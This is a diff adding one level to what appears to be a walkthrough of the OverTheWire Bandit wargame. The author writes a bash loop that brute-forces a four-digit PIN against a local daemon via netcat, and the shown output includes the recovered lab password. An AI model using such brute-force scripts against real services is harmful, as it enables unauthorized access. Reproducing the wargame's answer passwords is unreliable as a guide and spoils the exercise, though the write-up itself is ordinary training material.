@@ -350,3 +350,59 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 
 
+---
+
+### Bandit24 -> Level25
+
+* Task
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+
+* In this level i had to create a script which would first have the password for the current level and four digit number.
+* I first create a new directory to work in.
+
+```
+bandit24@bandit: mkdir -p /tmp/bruteforcer
+```
+
+* I then create a script that will iterated over 0000 - 9999 for the pin and give the password, with space separating them.
+
+```
+#!/bin/bash
+
+for i in {0000..9999}; 
+do  
+	echo -n $(cat /etc/bandit_pass/bandit24) && echo -n " " && echo $i
+done
+```
+
+* At each iteration the following occurs;
+
+1. the password is displayed
+2. space is created.
+3. display the four digit pin.
+
+* I then pipe the script to netcat so i can recieve the password for the next level.
+
+```
+bandit24@bandit:/tmp/bruteforcer$./bandit24bruteforcer.sh|nc localhost 30002
+
+```
+
+* Output
+
+
+```
+
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+
